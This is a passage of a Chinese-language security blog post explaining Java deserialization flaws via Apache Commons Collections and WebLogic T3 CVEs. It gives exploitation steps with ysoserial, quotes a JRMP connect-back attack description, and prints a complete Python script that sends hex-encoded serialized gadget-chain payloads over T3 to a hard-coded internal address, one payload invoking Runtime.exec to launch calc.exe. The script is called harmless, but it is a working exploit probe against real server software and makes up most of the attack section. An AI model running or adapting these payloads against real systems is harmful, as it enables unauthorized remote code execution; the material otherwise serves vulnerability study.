<p>如果Java应用没有对传入的序列化数据进行安全性检查，我们可以将恶意的TransformedMap序列化后，远程提交给Java应用，如果Java应用可以触发变换，即可成功远程命令执行。那如何让Java应用触发Transformer的变换呢？<br>在进行反序列化时，我们会调用ObjectInputStream类的readObject()方法。如果被反序列化的类重写了readObject()，那么该类在进行反序列化时，Java会优先调用重写的readObject()方法。<br>结合前述Commons Collections的特性，如果某个可序列化的类重写了readObject()方法，并且在readObject()中对Map类型的变量进行了键值修改操作，并且这个Map变量是可控的，就可以实现我们的攻击目标了。<br>我们观察到java运行库中有这样一个类AnnotationInvocationHandler，这个类有一个成员变量memberValues是Map类型.<br><img src="/upload_image/16.png" alt=""><br>AnnotationInvocationHandler的readObject()函数中对memberValues的每一项调用了setValue()函数。<br><img src="/upload_image/20.png" alt=""><br>因此，我们只需要使用前面构造的Map来构造AnnotationInvocationHandler，进行序列化，当触发readObject()反序列化的时候，就能实现命令执行。<br>这段POC本质上就是利用反射调用Runtime() 执行了一段系统命令，作用等同于：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">((Runtime)Runtime.class.getMethod(<span class="string">"getRuntime"</span>,null).invoke(null,null)).<span class="built_in">exec</span>(<span class="string">"calc.exe"</span>);</div></pre></td></tr></table></figure></p>
<h3 id="Weblogic-Exploit"><a href="#Weblogic-Exploit" class="headerlink" title="Weblogic Exploit"></a>Weblogic Exploit</h3><p>Oracle Weblogic <strong>T3</strong> Deserialization Remote Code Execution Vulnerability<br>CVE-2015-4852<br>CVE-2016-0638<br>CVE-2016-3510<br>CVE-2017-3248<br>weblogic 采用T3协议进行序列化数据的传输，可以看到weblogic发送的JAVA序列化数据分为6个部分，第一部分的前四个字节为整个数据包的长度，第2-6部分均为JAVA序列化数据。经测试，必须先发送T3协议头数据包，再发送JAVA序列化数据包，才能使weblogic进行JAVA反序列化，进而触发漏洞。如果只发送JAVA序列化数据包，不先发送T3协议头数据包，无法触发漏洞。<br><img src="/upload_image/15.png" alt=""></p>
<h5 id="CVE-2015-4852"><a href="#CVE-2015-4852" class="headerlink" title="CVE-2015-4852"></a>CVE-2015-4852</h5><p>blacklist<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">org.apache.commons.collections.functors*</div><div class="line">com.sun.org.apache.xalan.internal.xsltc.trax*</div><div class="line">javassist*</div><div class="line">org.codehaus.groovy.runtime.ConvertedClosure</div><div class="line">org.codehaus.groovy.runtime.ConversionHandler</div><div class="line">org.codehaus.groovy.runtime.MethodClosure</div></pre></td></tr></table></figure></p>
<p>CVE-2015-4852的反序列化的点有三个：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">weblogic.rjvm.InboundMsgAbbrev.class::ServerChannelInputStream</div><div class="line">weblogic.rjvm.MsgAbbrevInputStream.class</div><div class="line">weblogic.iiop.Utils.class</div></pre></td></tr></table></figure></p>
<p>后面的几个漏洞实质都是对黑名单的一个绕过。</p>
<h5 id="CVE-2016-0638"><a href="#CVE-2016-0638" class="headerlink" title="CVE-2016-0638"></a>CVE-2016-0638</h5><p>原理将反序列化的对象封装进了 weblogic.corba.utils.MarshalledObject，然后再对 MarshalledObject 进行序列化，生成 payload 字节码。反序列化时 MarshalledObject 不在 WebLogic 黑名单里，可正常反序列化，在反序列化时 MarshalledObject 对象调用 readObject 时对 MarshalledObject 封装的序列化对象再次反序列化，这样就逃过了黑名单的检查。</p>
<h5 id="CVE-2017-3248"><a href="#CVE-2017-3248" class="headerlink" title="CVE-2017-3248"></a>CVE-2017-3248</h5><p>利用了黑名单之外的反序列化类，通过 JRMP 协议达到执行任意反序列化 payload。（Java远程消息交换协议 JRMP 即 Java Remote MessagingProtocol ，是特定于 Java 技术的、用于查找和引用远程对象的协议。这是运行在 Java 远程方法调用 RMI 之下、TCP/IP 之上的线路层协议。）<br>下面给出一段在tenable找的描述<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">In the <span class="keyword">case</span> of WebLogic, we are interested <span class="keyword">in</span> yososerial<span class="string">'s JRMPListener.java payload. This serializes a RemoteObjectInvocationHandler which uses a UnicastRef object to establish a TCP connection to a remote server in order to get at the remote server'</span>s RMI registry. This connection uses JRMP so the client will deserialize whatever the server responds with, achieving unauthenticated remote code execution.</div><div class="line">Exploiting WebLogic</div><div class="line">To demonstrate the issue to ZDI and Oracle, Tenable created two scripts. The first script is a server that listens <span class="keyword">for</span> the callback, called jrmp_listener.py. When the connect back connects to jrmp_listener.py it will send a CommonCollections3 payload <span class="keyword">in</span> response <span class="built_in">which</span> will trigger the RCE on WebLogic. The second script sends the serialized object to WebLogic via t3 on TCP port 7001 (just like the original FoxGlove attack), called jrmp_connect_back.py. In order to exploit WebLogic, jrmp_listener.py must be executed before jrmp_connect_back.py. The result of the exploitation will cause the connect back, <span class="built_in">which</span> exists on its own thread, to be executed multiple <span class="built_in">times</span> (<span class="built_in">which</span> means an attacker could deliver multiple payloads).</div></pre></td></tr></table></figure></p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>漏洞利用的步骤：<br>1.找到一个接受外部输入的序列化对象的接收点，即反序列化漏洞的触发点。<br>2.应用的Class Path中是否包含Apache Commons Collections库（ysoserial所支持的其他库也行）<br>3.使用ysoserial来生成反序列化的payload，指定库名和想要执行的命令即可。<br>4.通过先前找到的传入对象方式进行对象注入，数据中载入payload，触发受影响应用中ObjectInputStream的反序列化操作，随后通过反射调用Runtime.getRunTime.exec即可完成利用。<br>最关键的是用恶意的序列化数据去替换正常的序列化数据</p>
<h5 id="ysoserial"><a href="#ysoserial" class="headerlink" title="ysoserial"></a>ysoserial</h5><p><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="external">ysoserial</a><br><img src="/upload_image/16.png" alt=""><br>下面给出一个’CVE-2016-0638’,’CVE-2016-3510’,’CVE-2017-3248’的无害poc<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line">import socket</div><div class="line">import time</div><div class="line">import re</div><div class="line"></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment">#  @author iswin@threathunter.org</span></div><div class="line"><span class="comment">#  reffer: nessus</span></div><div class="line"><span class="comment">#</span></div><div class="line"></div><div class="line">VUL=[<span class="string">'CVE-2016-0638'</span>,<span class="string">'CVE-2016-3510'</span>,<span class="string">'CVE-2017-3248'</span>]</div><div class="line">PAYLOAD=[<span class="string">'aced0005737200257765626c6f6769632e6a6d732e636f6d6d6f6e2e53747265616d4d657373616765496d706c6b88de4d93cbd45d0c00007872001f7765626c6f6769632e6a6d732e636f6d6d6f6e2e4d657373616765496d706c69126161d04df1420c000078707a000003f728200000000000000100000578aced00057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b7870737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b0200007870000000014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707371007e00007372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b7870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001e00000002767200106a61767a0000018e612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001e7371007e00167571007e001b00000002707571007e001b00000000740006696e766f6b657571007e001e00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e001b7371007e0016757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000863616c632e657865740004657865637571007e001e0000000171007e00237371007e0011737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f40000000000010770800000010000000007878767200126a6176612e6c616e672e4f766572726964650000000000000000000000787071007e003a78'</span>,<span class="string">'aced0005737200257765626c6f6769632e636f7262612e7574696c732e4d61727368616c6c65644f626a656374592161d5f3d1dbb6020002490004686173685b00086f626a42797465737400025b427870b6f794cf757200025b42acf317f8060854e0020000787000000130aced00057372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000074000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a99020000787000000001767200106a6176612e6c616e672e53797374656d00000000000000000000007870'</span>,<span class="string">'aced0005737d00000001001a6a6176612e726d692e72656769737472792e5265676973747279787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707732000a556e696361737452656600093132372e302e302e3100000000000000006ed6d97b00000000000000000000000000000078'</span>]</div><div class="line">VER_SIG=[<span class="string">'weblogic.jms.common.StreamMessageImpl'</span>,<span class="string">'org.apache.commons.collections.functors.InvokerTransformer'</span>,<span class="string">'\\$Proxy[0-9]+'</span>]</div><div class="line"></div><div class="line">def t3handshake(sock,server_addr):</div><div class="line">    sock.connect(server_addr)</div><div class="line">    sock.send(<span class="string">'74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'</span>.decode(<span class="string">'hex'</span>))</div><div class="line">    time.sleep(1)</div><div class="line">    sock.recv(1024)</div><div class="line">    <span class="built_in">print</span> <span class="string">'handshake successful'</span></div><div class="line"></div><div class="line">def buildT3RequestObject(sock,port):</div><div class="line">    data1 = <span class="string">'000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371'</span></div><div class="line">    data2 = <span class="string">'007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000&#123;0&#125;ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07'</span>.format(<span class="string">'&#123;:04x&#125;'</span>.format(dport))</div><div class="line">    data3 = <span class="string">'1a7727000d3234322e323134'</span></div><div class="line">    data4 = <span class="string">'2e312e32353461863d1d0000000078'</span></div><div class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> [data1,data2,data3,data4]:</div><div class="line">        sock.send(d.decode(<span class="string">'hex'</span>))</div><div class="line">    time.sleep(2)</div><div class="line">    <span class="built_in">print</span> <span class="string">'send request payload successful,recv length:%d'</span>%(len(sock.recv(2048)))</div><div class="line"></div><div class="line"></div><div class="line">def sendEvilObjData(sock,data):</div><div class="line">    payload=<span class="string">'056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000'</span></div><div class="line">    payload+=data</div><div class="line">    payload+=<span class="string">'fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff'</span></div><div class="line">    payload = <span class="string">'%s%s'</span>%(<span class="string">'&#123;:08x&#125;'</span>.format(len(payload)/2 + 4),payload)</div><div class="line">    sock.send(payload.decode(<span class="string">'hex'</span>))</div><div class="line">    res = <span class="string">''</span></div><div class="line">    try:</div><div class="line">        <span class="keyword">while</span> True:</div><div class="line">            res += sock.recv(4096)</div><div class="line">            time.sleep(0.1)</div><div class="line">    except Exception as e:</div><div class="line">        pass</div><div class="line">    <span class="built_in">return</span> res</div><div class="line"></div><div class="line">def checkVul(res,server_addr,index):</div><div class="line">    p=re.findall(VER_SIG[index], res, re.S)</div><div class="line">    <span class="keyword">if</span> len(p)&gt;0:</div><div class="line">        <span class="built_in">print</span> <span class="string">'%s:%d is vul %s'</span>%(server_addr[0],server_addr[1],VUL[index])</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="built_in">print</span> <span class="string">'%s:%d is not vul %s'</span> % (server_addr[0],server_addr[1],VUL[index])</div><div class="line"></div><div class="line"></div><div class="line">def run(dip,dport,index):</div><div class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">    <span class="comment">##打了补丁之后，会阻塞，所以设置超时时间，默认15s，根据情况自己调整</span></div><div class="line">    sock.settimeout(50)</div><div class="line">    server_addr = (dip, dport)</div><div class="line">    t3handshake(sock,server_addr)</div><div class="line">    buildT3RequestObject(sock,dport)</div><div class="line">    rs=sendEvilObjData(sock,PAYLOAD[index])</div><div class="line">    checkVul(rs,server_addr,index)</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</div><div class="line">    dip = <span class="string">'10.8.56.17'</span></div><div class="line">    dport = 7001</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(0,len(VUL)):</div><div class="line">        run(dip,dport,i)</div></pre></td></tr></table></figure></p>
<p>漏洞验证环境可以用phith0n牛的weblogic环境：<a href="https://github.com/phith0n/vulhub/tree/master/weblogic/weak_password" target="_blank" rel="external">weak_password</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://wsygoogol.github.io/2016/10/10/Java反序列化漏洞/" data-id="cjbohpb4800067o1bkltrfsgo" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">__('next') &raquo;</a>
  </nav>
</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">November 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">January 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/12/">December 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">October 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">September 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2017/12/27/大型互联网企业入侵检测实战总结/">大型互联网企业入侵检测实战总结</a>
          </li>
        
          <li>
            <a href="/2017/11/03/蜜罐与内网安全/">蜜罐与内网安全</a>
          </li>
        
          <li>
            <a href="/2017/09/12/Java反序列化漏洞利用的学习与实践/">Java反序列化漏洞利用的学习与实践</a>
          </li>
        
          <li>
            <a href="/2017/08/11/机器学习再信息安全中的应用/">机器学习在信息安全中的应用</a>
          </li>
        
          <li>
            <a href="/2017/07/18/解密Struts2-POC/">解密Struts2 POC</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <!--
<footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2017 SY0U<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
-->

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>

  </div>
</body>
</html>